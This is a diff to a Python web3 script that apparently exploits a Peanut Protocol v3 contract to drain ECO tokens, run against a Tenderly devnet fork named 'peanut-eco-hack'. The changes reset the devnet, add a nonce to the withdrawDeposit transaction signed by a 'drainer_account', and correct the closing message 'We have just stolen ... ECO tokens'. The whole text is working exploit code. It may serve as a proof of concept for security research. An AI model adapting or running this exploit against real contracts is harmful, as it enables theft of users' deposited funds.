@@ -7,8 +7,11 @@ from eth_keys.main import PrivateKey
 from eth_abi.encoding import PackedAddressEncoder
 from eth_account.datastructures import SignedMessage
 
-OPTIMISM_TENDERLY_RPC = 'https://rpc.vnet.tenderly.co/devnet/peanut-eco-hack/db06ef19-bcc6-4e7a-bcbd-7d86375b2ddf'
+OPTIMISM_TENDERLY_RPC = 'https://rpc.vnet.tenderly.co/devnet/peanut-eco-hack/3659f219-bb8e-43b2-9f21-960049cc91d5'
 web3 = Web3(HTTPProvider(OPTIMISM_TENDERLY_RPC))
+
+# Make sure that the devnet is in a clean state
+web3.provider.make_request('evm_revert', ['0x1'])  # type: ignore
 
 INFINITE_AMOUNT = 2 ** 256 - 1
 
@@ -109,13 +112,15 @@ signed_message: SignedMessage = drainer_account.signHash(hashed_packed_drainer_a
 signature = bytes(signed_message.signature)
 print('Signature', signature.hex())
 
+nonce = web3.eth.get_transaction_count(drainer_account.address) # type: ignore
 tx_params = peanut_v3_contract.functions.withdrawDeposit(
     latest_deposit_idx,
     drainer_account.address,
     hashed_packed_drainer_address,
     signature
 ).build_transaction({
-    'from': drainer_account.address
+    'from': drainer_account.address,
+    'nonce': nonce
 })
 signed_tx = drainer_account.sign_transaction(tx_params)
 response = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
@@ -126,4 +131,4 @@ print('Altered Peanut Balance', altered_peanut_balance)
 
 inflation_adjuted_initial_balance = initial_peanut_balance / EXPECTED_INITIAL_INFLATION
 inflation_adjusted_altered_balance = altered_peanut_balance / updated_inflation
-print(f'We have just stoled {inflation_adjuted_initial_balance - inflation_adjusted_altered_balance} ECO tokens :)))')
+print(f'We have just stolen {inflation_adjuted_initial_balance - inflation_adjusted_altered_balance} ECO tokens :)))')
